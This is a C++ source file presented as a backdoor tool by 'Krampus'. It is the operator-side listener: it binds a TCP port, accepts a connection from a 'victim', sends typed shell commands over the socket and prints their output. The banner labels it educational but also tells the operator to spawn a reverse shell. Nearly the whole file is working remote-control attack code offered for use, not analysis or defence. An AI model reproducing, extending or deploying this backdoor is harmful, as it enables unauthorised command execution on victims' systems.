//
// Backdoor made by Krampus
//

// Basic Libraries
#include <iostream>
#include <string>
#include <cstring>
// Socket Libraries
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

using namespace std;

string backdoor_version = "1.0.0-beta";
char *port = (char *) "5000";
int max_connections = 2;

void print_banner()
{
    cout<<"\n=========================================================\n";
    cout<<"\nBackdoor by Krampus - Made with educational purposes\n";
    cout<<"\nnBackdoor ::: "<<backdoor_version<<"\n";
    cout<<"\n=========================================================\n";
    cout<<"\n[!] Note: This is a really ugly shell, i recommend you to spawn a reverse shell";
    cout<<"\n[!] Important: Use exit to finish the session!\n";
    cout<<"\n[+] Listening for connections in port "<<port<<endl;
}

void main_socket()
{
    // Describing the socket
    int socket_desc = socket( AF_INET, SOCK_STREAM, IPPROTO_TCP );

    if ( socket_desc < 0 )
    {
        cout<<"\n[x] An error has ocurred while describing the socket!\n";
        exit(2);
    }

    // Forcing socket to be set in the port established early
    int opt = 1;
    int force_socket_addr = setsockopt( socket_desc, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt) );
    int force_socket_port = setsockopt( socket_desc, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt) );

    if ( force_socket_addr < 0 )
    {
        cout<<"\n[x] An error has ocurred while setting option SO_REUSEADDR!\n";
        exit(2);
    }

    if ( force_socket_port < 0 )
    {
        cout<<"\n[x] An error has ocurred while setting option SO_REUSEPORT!\n";
        exit(2);
    }

    // Bind Socket
    struct sockaddr_in address;
    int addrlen = sizeof(address);
    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    int fport = atoi( port );
    address.sin_port = htons( fport );

    int bind_socket = bind( socket_desc, (struct sockaddr *)&address, sizeof(address) );

    if ( bind_socket < 0 )
    {
        cout<<"\n[x] An error has ocurred while binding the socket!\n";
        exit(2);
    }

    // Listen for connections
    int listen_connections = listen( socket_desc, max_connections );
    if ( listen_connections < 0 )
    {
        cout<<"\n[x] An error has ocurred while listening for connections!\n";
        exit(2);
    }
    print_banner();

    // Accept new connections
    int socket_client = accept( socket_desc, (struct sockaddr *)&address, (socklen_t *)&addrlen );
    if ( socket_client < 0 )
    {
        cout<<"\n[x] An error has ocurred while accepting a new client!\n";
        exit(2);
    }

    // Getting client IP address
    string client_ip = inet_ntoa( address.sin_addr );
    cout<<"\n[+] New connections received from "<<client_ip<<endl;

    // Interactive Shell
    char command[1024];
    char buffer[1024] = {0};
    int output;
    do {

        // Requesting command
        cout<<"\n"<<client_ip<<"$ ";
        cin.getline(command, sizeof(command));
        send( socket_client, command, strlen(command), 0 );

        output = read( socket_client, buffer, 1024 );
        cout<<"\n"<<buffer<<endl;

    } while ( strcmp(command, "exit") );
    
    close(socket_desc);
}

void helpPanel( char **argv )
{
    cout<<"\n[*] Usage: "<<argv[0]<<" -p <victim port>\n";
}

void args_controller( int argc, char **argv )
{
    for ( int i = 0; i < argc; i++ )
    {
        if ( strcmp( argv[i], "-h" ) != 0 && argc < 2 )
        {
            cout<<"\n[x] Use: "<<argv[0]<<" -h\n";
            exit(1);
        }

        if ( strcmp( argv[i], "-p" ) == 0 )
        {
            port = argv[i+1];
        }

        if ( strcmp( argv[i], "-h" ) == 0 )
        {
            helpPanel( argv );   
        }
    }
}

int main( int argc, char **argv )
{
    args_controller( argc, argv );
    main_socket();
    return 0;
}
